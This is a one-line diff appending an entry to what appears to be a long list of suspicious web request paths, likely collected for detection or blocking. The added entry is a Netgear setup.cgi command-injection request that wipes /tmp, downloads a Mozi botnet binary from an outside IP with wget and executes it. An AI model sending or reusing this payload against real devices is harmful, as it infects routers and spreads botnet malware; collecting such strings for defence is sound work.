@@ -50281,3 +50281,4 @@ http://ifconfig.me/
 /wp-singin.php
 /acp.php?p=
 /mysbnnqg.php?Fox=d3wL7
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://222.142.210.185:43384/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
